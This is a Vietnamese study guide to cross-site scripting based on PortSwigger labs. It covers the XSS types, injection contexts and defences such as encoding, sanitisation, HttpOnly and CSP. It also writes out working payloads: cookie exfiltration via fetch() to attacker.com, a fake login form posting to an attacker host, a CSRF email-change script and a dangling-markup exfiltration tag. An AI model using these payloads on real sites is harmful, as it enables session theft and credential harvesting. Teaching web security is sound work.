# Cross-Site Scripting (XSS)

> **Cre:** [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

---

## 1. Lỗ hổng Cross-Site Scripting (XSS) là gì?

### 1.1. Định nghĩa
**Cross-Site Scripting (XSS)** là một lỗ hổng an ninh web cho phép kẻ tấn công can thiệp và thao túng các tương tác giữa người dùng với một ứng dụng web dễ bị tổn thương. 

Về bản chất, XSS cho phép kẻ tấn công vượt qua **Chính sách cùng nguồn gốc (Same-Origin Policy - SOP)** — một cơ chế bảo mật cốt lõi của các trình duyệt web hiện đại nhằm cô lập dữ liệu và hành động của các trang web khác nhau.

```
+-----------------------------------------------------------------------------------+
|                                 SO SÁNH BẢN CHẤT                                  |
+-----------------------------------------------------------------------------------+
|  SQL Injection (SQLi)  | Lừa DATABASE (Backend) thực thi câu lệnh SQL độc hại.     |
+------------------------+----------------------------------------------------------+
|  Cross-Site Scripting  | Mượn tay WEBSITE để lừa TRÌNH DUYỆT CỦA NẠN NHÂN (Client)|
|  (XSS)                 | thực thi mã JavaScript độc hại.                          |
+-----------------------------------------------------------------------------------+
```

### 1.2. Cách thức XSS hoạt động (How XSS works)
XSS hoạt động bằng cách thao túng một trang web không an toàn để nó phản hồi hoặc lưu trữ mã JavaScript độc hại. Khi một nạn nhân vô tình tải trang web đó, trình duyệt của nạn nhân sẽ tải về và tự động thực thi đoạn mã JavaScript do kẻ tấn công cài cắm.

Bởi vì đoạn mã này được tải về từ chính domain của trang web hợp lệ, trình duyệt của nạn nhân **tin tưởng tuyệt đối** và cho phép nó truy cập toàn bộ tài nguyên, dữ liệu và quyền hạn của người dùng trên trang đó.

### 1.3. Vượt qua Chính sách Cùng nguồn gốc (Same-Origin Policy - SOP)
*   **Chính sách SOP là gì?** SOP quy định rằng mã JavaScript chạy trên domain `website-a.com` tuyệt đối không được phép đọc dữ liệu (như cookie, DOM, token) của `website-b.com`.
*   **XSS phá vỡ SOP như thế nào?** Thay vì tấn công từ bên ngoài, XSS đưa mã độc chạy **ngay từ bên trong** nguồn gốc (Origin) của trang web mục tiêu. Lúc này, mã của kẻ tấn công mang cùng Origin với trang web, do đó SOP hoàn toàn bị vô hiệu hóa đối với phiên làm việc đó.

### 1.4. Mức độ tác động (Impact of XSS)
Khi một cuộc tấn công XSS thành công, kẻ tấn công có thể:
*   **Mạo danh nạn nhân (Impersonation):** Đánh cắp phiên làm việc và thực hiện bất kỳ hành động nào mà người dùng đó được phép thực hiện trên hệ thống.
*   **Đọc trộm dữ liệu nhạy cảm:** Đọc nội dung email, thông tin thẻ tín dụng, tin nhắn riêng tư, dữ liệu định danh cá nhân (PII) mà nạn nhân có quyền truy cập.
*   **Đánh cắp thông tin xác thực:** Đọc cookie phiên, token xác thực, hoặc tạo form đăng nhập giả mạo ngay trên giao diện để thu hoạch tài khoản/mật khẩu.
*   **Thay đổi giao diện trang web (Defacement):** Biến đổi hoàn toàn giao diện trang web, hiển thị thông điệp thù địch hoặc lừa đảo.
*   **Cài cắm mã độc thứ cấp (Trojan Functionality):** Chèn các keylogger ngầm, botnet hoặc lừa người dùng tải phần mềm độc hại về máy tính.

---

## 2. Vì sao lỗ hổng XSS tồn tại?

### 2.1. Bản chất: Nhập nhằng giữa "Mã lệnh" (Code) và "Dữ liệu" (Data)
Tương tự như SQL Injection, nguyên nhân gốc rễ của XSS xuất phát từ việc **trộn lẫn không an toàn** giữa cấu trúc mã HTML/JavaScript và dữ liệu do người dùng nhập vào (`untrusted input`).

Trình duyệt web phân tích trang theo định dạng văn bản (HTML Parser). Khi ứng dụng web in trực tiếp dữ liệu người dùng ra trang mà không mã hóa (encode), trình duyệt sẽ hiểu nhầm các ký tự đặc biệt của HTML (như `<`, `>`, `"`, `'`) là **cú pháp thẻ lệnh mới**, từ đó biên dịch và thực thi dữ liệu của kẻ tấn công dưới dạng mã lệnh JavaScript.

### 2.2. Điểm yếu trong mô hình tin cậy của Trình duyệt (Browser Trust Model)
Trình duyệt web không thể tự mình biết được một thẻ `<script>` trên trang là do lập trình viên của hệ thống viết ra hay do kẻ tấn công vừa chèn vào qua một ô bình luận. Trình duyệt chỉ tuân theo nguyên tắc: **Cứ thấy thẻ script hợp lệ trong luồng HTML thì lập tức thực thi.**

---

## 3. Proof of Concept (PoC) trong XSS

Để kiểm tra (audit) xem một ứng dụng có bị dính XSS hay không, chuyên gia bảo mật thường sử dụng các đoạn mã PoC an toàn, nhằm kích hoạt một hành động trực quan trên trình duyệt mà không gây hại cho hệ thống.

### 3.1. Các hàm kiểm chứng PoC tiêu chuẩn
Theo truyền thống, các hàm hiển thị hộp thoại pop-up thường được sử dụng:
*   `alert(1)`: Hiển thị một pop-up cảnh báo với số 1.
*   `print()`: Mở hộp thoại in ấn của trình duyệt.
*   `prompt(1)`: Mở hộp thoại yêu cầu nhập dữ liệu.

```html
<script>alert(1)</script>
```

#### 🔍 Bảng giải thích chi tiết từng thành phần Payload `PoC`:

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `<script>` | Thẻ mở HTML báo hiệu cho trình duyệt biết khối ký tự tiếp theo là mã kịch bản thực thi (JavaScript), không phải văn bản thô. |
| `alert(1)` | Lệnh JavaScript gọi hàm `alert()` với đối số số nguyên `1`, tạo ra một hộp thoại modal trên màn hình nạn nhân. |
| `</script>` | Thẻ đóng HTML, báo hiệu kết thúc khối mã kịch bản và trả quyền điều khiển về lại cho trình phân tích cú pháp HTML. |

> 📌 **Lưu ý thực tế:** Trên các trình duyệt hiện đại (như Chrome, Firefox), hàm `alert()` đôi khi bị chặn trong một số iframe hoặc môi trường sandbox. PortSwigger và các kỳ thi an ninh mạng hiện đại thường khuyến nghị sử dụng hàm `print()`:
> ```html
> <script>print()</script>
> ```

---

## 4. Ba loại tấn công XSS chính (Types of XSS attacks)

PortSwigger phân loại XSS thành **3 dạng chính**, dựa trên con đường mà mã độc thâm nhập vào trình duyệt:

```
+----------------------------------------------------------------------------------------+
|                                    CÁC LOẠI XSS                                        |
+----------------------------------------------------------------------------------------+
| 1. Reflected XSS | Mã độc đến từ HTTP Request hiện tại (phản xạ tức thì qua Server).  |
| 2. Stored XSS    | Mã độc được lưu vĩnh viễn trong Database của Server.                |
| 3. DOM-based XSS | Mã độc xuất hiện và được thực thi hoàn toàn ở Client-side (DOM).    |
+----------------------------------------------------------------------------------------+
```

---

### 4.1. Reflected XSS (XSS Phản xạ / Không lưu trữ)

#### A. Cơ chế hoạt động
Reflected XSS xảy ra khi ứng dụng nhận dữ liệu từ một HTTP Request (thường là query parameters trong URL) và đưa dữ liệu đó vào phản hồi HTTP (Response) ngay lập tức **mà không được mã hóa hoặc xử lý an toàn**.

Mã độc không được lưu lại trên máy chủ; nó chỉ "phản xạ" từ request của người dùng trở lại màn hình của chính người đó. Do đó, kẻ tấn công phải dụ nạn nhân bấm vào một liên kết độc hại do chúng tạo ra.

```
[Kẻ tấn công] --(1) Gửi link độc hại chứa JS--> [Nạn nhân]
                                                     |
                                            (2) Bấm vào link
                                                     v
[Server Ứng dụng] <--(3) Gửi HTTP Request kèm JS-----+
       |
  (In trực tiếp input vào HTML response)
       |
       +--(4) Trả về trang HTML chứa mã độc--------> [Trình duyệt Nạn nhân]
                                                             |
                                                    (5) Thực thi mã JS độc!
```

#### B. Kịch bản khai thác thực tế
*   **Ngữ cảnh:** Trang web có chức năng tìm kiếm sản phẩm:
    ```html
    https://insecure-website.com/search?term=Gift
    ```
*   **Mã nguồn phía server xử lý:**
    ```php
    // In trực tiếp từ khóa tìm kiếm ra giao diện HTML
    echo "<p>Kết quả tìm kiếm cho: " . $_GET['term'] . "</p>";
    ```
*   **Kẻ tấn công tạo liên kết độc hại:**
    ```html
    https://insecure-website.com/search?term=<script>alert(document.cookie)</script>
    ```

#### 🔍 Phân tích chi tiết từng thành phần Payload:

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `<script>` | Bắt đầu khối mã lệnh JavaScript. |
| `alert(...)` | Tạo pop-up hiển thị dữ liệu ra màn hình. |
| `document.cookie` | Thuộc tính DOM của JavaScript dùng để đọc toàn bộ Cookie phiên của người dùng hiện tại đang được lưu trên trình duyệt. |
| `</script>` | Kết thúc khối mã lệnh. |

*   **Kết quả:** Khi nạn nhân bấm vào link, hộp thoại chứa toàn bộ Cookie phiên của họ sẽ hiện lên màn hình.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) *(Độ khó: PRACTITIONER / APPRENTICE)*

---

### 4.2. Stored XSS (XSS Lưu trữ / Vĩnh viễn)

#### A. Cơ chế hoạt động
Stored XSS (còn gọi là Persistent XSS hoặc Second-order XSS) là dạng XSS **nguy hiểm nhất**. Lỗ hổng xảy ra khi ứng dụng nhận dữ liệu đầu vào từ người dùng và **lưu trữ vĩnh viễn dữ liệu đó vào cơ sở dữ liệu (Database)** mà không được làm sạch (sanitize).

Sau đó, mỗi khi có bất kỳ người dùng nào truy cập vào trang web có hiển thị dữ liệu này (ví dụ trang bài viết có bình luận), đoạn mã độc sẽ được server lấy từ cơ sở dữ liệu ra và in vào mã HTML trả về cho người xem.

```
[Kẻ tấn công] --(1) Gửi bình luận chứa mã JS độc--> [Server Ứng dụng]
                                                             |
                                                    (2) Lưu vào Database!
                                                             |
[Nạn nhân A] --(3) Vào xem bài viết bình thường------------->+
[Nạn nhân B]                                                 |
                                                    (4) Đọc DB & in JS ra
                                                             |
[Trình duyệt Nạn nhân A & B] <--(5) Nhận HTML chứa mã độc----+
             |
   (TỰ ĐỘNG THỰC THI MÃ ĐỘC MÀ KHÔNG CẦN BẤM LINK LẠ!)
```

#### B. Kịch bản khai thác thực tế
*   **Ngữ cảnh:** Chức năng bình luận trên một trang blog hoặc diễn đàn.
*   **Kẻ tấn công gửi nội dung bình luận:**
    ```html
    Bài viết rất hay! <script>fetch('https://attacker.com/log?cookie=' + encodeURIComponent(document.cookie))</script>
    ```

#### 🔍 Phân tích chi tiết từng thành phần Payload:

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `Bài viết rất hay!` | Chuỗi văn bản bình thường nhằm đánh lừa người kiểm duyệt nội dung. |
| `<script>` | Mở thẻ định nghĩa mã JavaScript. |
| `fetch(...)` | API hiện đại của trình duyệt dùng để gửi một HTTP Request ngầm trong nền mà không làm gián đoạn hay tải lại trang web. |
| `'https://attacker.com/log?cookie='` | Địa chỉ máy chủ thu thập dữ liệu do kẻ tấn công kiểm soát. |
| `+` | Toán tử nối chuỗi trong JavaScript. |
| `encodeURIComponent(...)` | Hàm mã hóa các ký tự đặc biệt (dấu cách, chấm phẩy, bằng) sang định dạng URL Encoding để dữ liệu truyền qua URL không bị gãy chuỗi. |
| `document.cookie` | Đọc toàn bộ cookie phiên của bất kỳ ai đang xem bài viết. |
| `</script>` | Đóng thẻ script. |

*   **Kết quả:** Bất kỳ ai (kể cả Quản trị viên - Admin) khi vào đọc bài viết blog này đều sẽ bị trình duyệt âm thầm gửi toàn bộ Cookie phiên về máy chủ của kẻ tấn công mà hoàn toàn không hay biết.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded) *(Độ khó: APPRENTICE)*

---

### 4.3. DOM-based XSS (XSS dựa trên DOM)

#### A. Cơ chế hoạt động
Khác biệt hoàn toàn với Reflected và Stored XSS, **DOM-based XSS xảy ra hoàn toàn ở phía Client-side (trình duyệt)**, không phụ thuộc vào việc Backend có in dữ liệu ra HTML hay không.

DOM-based XSS phát sinh khi đoạn mã JavaScript phía frontend của trang web:
1.  Đọc dữ liệu từ một **Source (Nguồn dữ liệu không an toàn do người dùng kiểm soát)**.
2.  Sau đó ghi dữ liệu đó vào một **Sink (Điểm tiếp nhận nguy hiểm hỗ trợ thực thi mã HTML/JS)**.

```
[URL: ?default=English] ---> [Source: location.search]
                                    |
                           (Đoạn mã JS trên Web)
                                    |
                                    v
                             [Sink: document.write()] ---> [Trình duyệt chạy mã JS độc!]
```

#### B. Bảng phân loại Source & Sink phổ biến trong JavaScript

##### 1. Các "Sources" phổ biến (Nơi nhận input từ người dùng):
*   `document.URL`
*   `document.documentURI`
*   `document.URLUnencoded`
*   `document.baseURI`
*   `location.search` (Query parameter sau dấu `?`)
*   `location.hash` (Đoạn sau dấu `#`)
*   `location.pathname`
*   `document.cookie`
*   `document.referrer`
*   `window.name`

##### 2. Các "Sinks" nguy hiểm (Nơi gây ra thực thi mã nếu nhận dữ liệu thô):
*   `document.write()` / `document.writeln()`
*   `element.innerHTML`
*   `element.outerHTML`
*   `eval()`
*   `setTimeout()` / `setInterval()` (khi nhận tham số là một chuỗi)
*   `location` / `location.href` / `location.assign()` (gây ra XSS dạng `javascript:...`)

#### C. Kịch bản khai thác thực tế
*   **Đoạn mã JavaScript bị lỗi trên trang web:**
    ```javascript
    // Lấy giá trị tham số ?returnUrl từ thanh địa chỉ (Source)
    var urlParams = new URLSearchParams(window.location.search);
    var returnUrl = urlParams.get('returnUrl');

    // Nhét thẳng vào DOM bằng Sink nguy hiểm (Sink)
    document.write('<a href="' + returnUrl + '">Quay lại trang chủ</a>');
    ```
*   **Kẻ tấn công tạo URL:**
    ```text
    https://insecure-website.com/login?returnUrl=javascript:alert(1)
    ```
    Hoặc thoát thuộc tính `href`:
    ```text
    https://insecure-website.com/login?returnUrl="><script>alert(1)</script>
    ```

#### 🔍 Phân tích chi tiết từng thành phần Payload:

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `"` | Dấu ngoặc kép dùng để đóng thuộc tính `href="` đang mở trước đó trong câu lệnh `document.write`. |
| `>` | Dấu đóng thẻ để kết thúc thẻ `<a>` sớm hơn bình thường. |
| `<script>` | Bắt đầu một thẻ thực thi mã lệnh mới độc lập. |
| `alert(1)` | Thực thi lệnh JavaScript hiển thị pop-up. |
| `</script>` | Đóng thẻ thực thi mã lệnh. |

*   **Kết quả:** Sau khi `document.write()` xử lý, cấu trúc DOM được sinh ra sẽ là:
    ```html
    <a href=""></a><script>alert(1)</script>">Quay lại trang chủ</a>
    ```
    Mã script được thực thi ngay lập tức trong cây DOM của trình duyệt.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink) *(Độ khó: APPRENTICE)*

---

## 5. XSS trong các ngữ cảnh khác nhau (XSS Contexts)

Khi tìm kiếm lỗ hổng XSS, kẻ tấn công phải xác định chính xác vị trí mà dữ liệu của mình xuất hiện trong mã nguồn HTML. Mỗi **ngữ cảnh (Context)** sẽ đòi hỏi kỹ thuật và cú pháp payload khác nhau để khai thác thành công.

### 5.1. Ngữ cảnh 1: Nằm giữa các thẻ HTML thông thường (Between HTML tags)
*   **Mã nguồn sinh ra:**
    ```html
    <p>Xin chào: USER_INPUT</p>
    ```
*   **Cách khai thác:** Đơn giản nhất, chỉ cần đưa trực tiếp thẻ `<script>` hoặc các thẻ HTML thực thi khác vào.
*   **Payload:** `<script>alert(1)</script>` hoặc `<img src=x onerror=alert(1)>`

---

### 5.2. Ngữ cảnh 2: Nằm bên trong thuộc tính HTML (Inside HTML attributes)
*   **Mã nguồn sinh ra:**
    ```html
    <input type="text" name="address" value="USER_INPUT">
    ```
*   **Cách 1 — Thoát khỏi thuộc tính (Break out of attribute):**
    *   **Payload:** `"><script>alert(1)</script>`
    *   **Cơ chế:** Dấu `"` đóng thuộc tính `value`, dấu `>` đóng thẻ `<input>`, sau đó chèn thẻ script mới.
*   **Cách 2 — Tận dụng Event Handler mà không cần đóng thẻ (Khi dấu `>` bị lọc):**
    *   **Payload:** `" autofocus onfocus="alert(1)`
    *   **Cơ chế:** Dấu `"` đóng thuộc tính `value`, thêm thuộc tính `autofocus` để tự động focus vào input khi tải trang, và `onfocus` để kích hoạt mã JS ngay lập tức.
    *   Mã HTML sinh ra:
        ```html
        <input type="text" name="address" value="" autofocus onfocus="alert(1)">
        ```

---

### 5.3. Ngữ cảnh 3: Nằm bên trong khối mã JavaScript (Inside JavaScript context)
*   **Mã nguồn sinh ra:**
    ```html
    <script>
        var searchKeyword = 'USER_INPUT';
        fetchSearchResults(searchKeyword);
    </script>
    ```
*   **Cách 1 — Đóng toàn bộ thẻ script để mở thẻ mới:**
    *   **Payload:** `</script><img src=x onerror=alert(1)>`
    *   **Cơ chế:** Trình phân tích HTML luôn ưu tiên tìm chuỗi `</script>` đầu tiên để kết thúc khối mã kịch bản, bất kể nó có nằm trong dấu nháy đơn hay không.
*   **Cách 2 — Thoát chuỗi và nối lệnh JavaScript (Break out of JS string):**
    *   **Payload:** `';alert(1);//`
    *   **Cơ chế:** 
        *   `'`: Đóng chuỗi string của biến `searchKeyword`.
        *   `;`: Kết thúc câu lệnh gán biến.
        *   `alert(1)`: Câu lệnh JavaScript độc lập được thực thi.
        *   `//`: Ký hiệu comment trong JS để vô hiệu hóa dấu nháy đơn `'` đóng ban đầu của lập trình viên.
    *   Mã sinh ra:
        ```javascript
        var searchKeyword = '';alert(1);//';
        ```

---

### 5.4. Ngữ cảnh 4: Nằm trong JavaScript Template Literals (Dấu backtick `` ` ``)
*   **Mã nguồn sinh ra:**
    ```javascript
    var greeting = `Xin chào ${name}, bạn đang tìm kiếm: USER_INPUT`;
    ```
*   **Cách khai thác:** JavaScript hỗ trợ nhúng biểu thức động bên trong chuỗi template literal thông qua cú pháp `${...}` mà không cần đóng dấu backtick.
*   **Payload:** `${alert(1)}`
*   **Mã sinh ra:**
    ```javascript
    var greeting = `Xin chào ${name}, bạn đang tìm kiếm: ${alert(1)}`;
    ```

---

## 6. Kẻ tấn công có thể làm gì với XSS trong thực tế? (Real-World Attacks)

XSS không chỉ dừng lại ở các pop-up `alert(1)`. Trong các cuộc tấn công thực tế, nó là một vũ khí nguy hiểm phục vụ cho các mục đích:

### 6.1. Đánh cắp Cookie & Chiếm đoạt phiên làm việc (Session Hijacking)
Hầu hết các trang web sử dụng Cookie để nhận diện phiên đăng nhập của người dùng. Kẻ tấn công dùng XSS để đọc giá trị này và gửi về máy chủ từ xa:

```javascript
// Gửi cookie về server của hacker qua fetch API
fetch('https://collab.attacker.com/?cookie=' + btoa(document.cookie));
```

### 6.2. Thu hoạch thông tin xác thực bằng Form giả mạo (Credential Harvesting)
Nếu cookie được bảo vệ bằng cờ `HttpOnly`, kẻ tấn công không thể đọc cookie bằng JS. Chúng sẽ chuyển sang tạo một form đăng nhập giả mạo đè lên trang web thật:

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;text-align:center;padding-top:100px;">
  <h2>Phiên làm việc đã hết hạn. Vui lòng đăng nhập lại:</h2>
  <form action="https://attacker.com/steal-creds" method="POST">
    <input type="text" name="username" placeholder="Tên đăng nhập"><br><br>
    <input type="password" name="password" placeholder="Mật khẩu"><br><br>
    <button type="submit">Đăng nhập</button>
  </form>
</div>
```
Người dùng đang đứng trên chính domain thật của trang web, URL trên thanh địa chỉ hoàn toàn hợp lệ, nên gần như 100% sẽ tin tưởng và nhập mật khẩu vào form này.

### 6.3. Giả mạo hành động của người dùng (CSRF thông qua XSS)
Kẻ tấn công có thể viết mã JavaScript để tự động gửi các yêu cầu thay đổi tài khoản:
```javascript
// Tự động gửi request đổi email của nạn nhân thành email hacker
var xhr = new XMLHttpRequest();
xhr.open("POST", "/my-account/change-email", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=hacker@attacker.com&csrf=" + document.getElementById("csrf_token").value);
```
*(Ngay cả khi trang web có cơ chế chống CSRF bằng Token, XSS vẫn đọc được CSRF Token từ DOM và vượt qua cơ chế này dễ dàng).*

---

## 7. Các cơ chế phòng thủ chuyên sâu & Dangling Markup

### 7.1. Content Security Policy (CSP)
**Content Security Policy (CSP)** là một cơ chế phòng thủ chuyên sâu thông qua HTTP Response Header, cho phép chủ sở hữu trang web tuyên bố danh sách các nguồn tài nguyên (script, image, style) mà trình duyệt được phép tải và thực thi:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
```
*   **Tác dụng chống XSS:** 
    *   Chặn hoàn toàn việc thực thi các script nội dòng (Inline scripts như `<script>alert(1)</script>`).
    *   Chặn việc chạy mã từ các thuộc tính sự kiện (`onload`, `onerror`).
    *   Chặn hàm `eval()`.
    *   Chỉ cho phép tải file JS từ domain của trang web (`'self'`) hoặc các domain đáng tin cậy đã được chỉ định.

### 7.2. Tấn công Dangling Markup Injection
Khi hệ thống có CSP chặn việc thực thi JavaScript, kẻ tấn công vẫn có thể dùng kỹ thuật **Dangling Markup** (chèn thẻ HTML cụt không đóng) để đánh cắp dữ liệu nhạy cảm trên trang (như CSRF token):
```html
<img src='https://attacker.com/steal?data=
```
*   Do không có dấu nháy đơn đóng, trình duyệt sẽ đọc toàn bộ văn bản và mã HTML phía sau (bao gồm cả các token nhạy cảm) cho đến khi gặp dấu nháy tiếp theo trên trang web, và gửi toàn bộ đoạn văn bản đó đến server của hacker dưới dạng một request tải ảnh!

---

## 8. Cách phòng chống XSS triệt để (How to prevent XSS)

Để loại bỏ hoàn toàn nguy cơ XSS, các tổ chức phát triển phần mềm cần áp dụng chiến lược phòng thủ đa lớp (Defense-in-Depth):

### 8.1. Mã hóa đầu ra theo đúng ngữ cảnh (Context-aware Output Encoding)
Đây là biện pháp **quan trọng nhất** để chống XSS. Trước khi in bất kỳ dữ liệu nào do người dùng cung cấp ra trang web, dữ liệu đó phải được mã hóa phù hợp với vị trí mà nó sẽ xuất hiện:

#### 1. Ngữ cảnh HTML Body:
Chuyển đổi các ký tự điều khiển HTML thành các thực thể an toàn (HTML Entities):
*   `<` $\rightarrow$ `&lt;`
*   `>` $\rightarrow$ `&gt;`
*   `&` $\rightarrow$ `&amp;`
*   `"` $\rightarrow$ `&quot;`
*   `'` $\rightarrow$ `&#x27;`

#### 2. Ngữ cảnh Thuộc tính HTML (Attribute Context):
Mã hóa chặt chẽ tất cả các ký tự không phải chữ và số thành dạng mã hex: `&#xHH;` để ngăn chặn việc thoát khỏi dấu ngoặc kép.

#### 3. Ngữ cảnh JavaScript:
Mã hóa các ký tự đặc biệt sang dạng Unicode escape:
*   `'` $\rightarrow$ `\u0027`
*   `"` $\rightarrow$ `\u0022`
*   `\` $\rightarrow$ `\u005c`

---

### 8.2. Làm sạch mã HTML (HTML Sanitization)
Trong trường hợp bắt buộc phải cho phép người dùng nhập mã HTML (ví dụ: trình soạn thảo bài viết rich-text blog, diễn đàn có in đậm, in nghiêng, đổi màu chữ), bạn **không thể mã hóa đầu ra** vì sẽ làm mất định dạng của người dùng.

Giải pháp là sử dụng thư viện **Sanitizer chuyên dụng** để quét và bóc tách các thẻ nguy hiểm (`<script>`, `<iframe>`, `object`) và các thuộc tính sự kiện (`onload`, `onerror`), chỉ giữ lại các thẻ an toàn (`<b>`, `<i>`, `<p>`):
*   **JavaScript / Node.js:** Sử dụng thư viện tiêu chuẩn ngành [DOMPurify](https://github.com/cure53/DOMPurify):
    ```javascript
    // Dữ liệu bẩn từ người dùng
    var dirtyInput = '<p>Xin chào <img src=x onerror=alert(1)></p>';
    
    // Làm sạch an toàn
    var cleanHTML = DOMPurify.sanitize(dirtyInput);
    // Kết quả chỉ còn: '<p>Xin chào <img src="x"></p>' (onerror đã bị loại bỏ)
    document.getElementById('content').innerHTML = cleanHTML;
    ```
*   **Java:** Sử dụng OWASP Java HTML Sanitizer.
*   **Python:** Sử dụng thư viện `bleach`.

---

### 8.3. Thiết lập cờ `HttpOnly` cho Cookie
Đối với tất cả các Cookie lưu trữ phiên đăng nhập (Session ID, JWT Token, Remember Me Token), lập trình viên bắt buộc phải cấu hình cờ **`HttpOnly`** từ phía Backend:

```http
Set-Cookie: session=xyz123456789; Secure; HttpOnly; SameSite=Strict
```
*   **Tác dụng:** Cấm trình duyệt cho phép bất kỳ đoạn mã JavaScript nào truy cập vào cookie này thông qua `document.cookie`. Dù trang web có bị dính lỗ hổng XSS, kẻ tấn công cũng **không thể cướp được session cookie** để mạo danh tài khoản.

---

### 8.4. Cấu hình Content Security Policy (CSP)
Triển khai một chính sách CSP chặt chẽ để vô hiệu hóa việc thực thi mã inline không xác thực:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedcdn.com; object-src 'none';
```

---

### 8.5. So sánh mã nguồn: Dễ bị tấn công (Vulnerable) vs An toàn (Secure)

#### ❌ Mã nguồn dễ bị tấn công (Vulnerable Code - Node.js / Express):
```javascript
app.get('/search', (req, res) => {
    const term = req.query.q;
    // NGUY HIỂM: Ghép trực tiếp input vào chuỗi HTML phản hồi
    res.send(`<h1>Kết quả tìm kiếm cho: ${term}</h1>`);
});
```

#### ✅ Mã nguồn an toàn (Secure Code - Node.js với Template Engine an toàn):
Hầu hết các Template Engine hiện đại (như EJS, Handlebars, Pug, React, Angular, Vue) đều **tự động mã hóa ngữ cảnh (Auto-escaping)** theo mặc định:

```javascript
// Sử dụng template engine (ví dụ EJS) với cú pháp tự động escape <%= ... %>
res.render('search.ejs', { searchTerm: term });

// Trong file search.ejs:
// <h1>Kết quả tìm kiếm cho: <%= searchTerm %></h1>
// Ký tự <script> sẽ tự động biến thành &lt;script&gt;
```

---

## 9. Danh mục các bài Lab XSS trên PortSwigger (Theo lộ trình học)

| Tên bài Lab | Dạng lỗ hổng | Ngữ cảnh khai thác |
| :--- | :--- | :--- |
| **Lab 1:** Reflected XSS into HTML context with nothing encoded | Reflected XSS | Giữa thẻ HTML thông thường |
| **Lab 2:** Stored XSS into HTML context with nothing encoded | Stored XSS | Giữa thẻ HTML thông thường |
| **Lab 3:** DOM XSS in `document.write` sink using source `location.search` | DOM-based XSS | Điểm nhận dữ liệu `document.write` |
| **Lab 4:** DOM XSS in `innerHTML` sink using source `location.search` | DOM-based XSS | Điểm nhận dữ liệu `element.innerHTML` |
| **Lab 5:** Reflected XSS into attribute with angle brackets HTML-encoded | Reflected XSS | Thuộc tính HTML (Dùng Event Handler) |
| **Lab 6:** Stored XSS into `href` attribute with double quotes HTML-encoded | Stored XSS | Thuộc tính URL (Dùng pseudo-protocol `javascript:`) |
| **Lab 7:** Reflected XSS into a JavaScript string with angle brackets encoded | Reflected XSS | Bên trong chuỗi JavaScript (Thoát chuỗi `';`) |
| **Lab 8:** Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped | Reflected XSS | Vượt qua escape bằng ký tự gạch chéo `\'` |
| **Lab 9:** Reflected XSS with event handlers and attributes blocked by WAF | WAF Bypass | Tùy biến thẻ và sự kiện HTML |
| **Lab 10:** Exploiting cross-site scripting to steal cookies | Khai thác thực tế | Đánh cắp cookie kết hợp Burp Collaborator |

---
*Tài liệu học tập và thực hành bảo mật ứng dụng web - Biên soạn dựa trên tiêu chuẩn giáo trình PortSwigger Web Security Academy.*
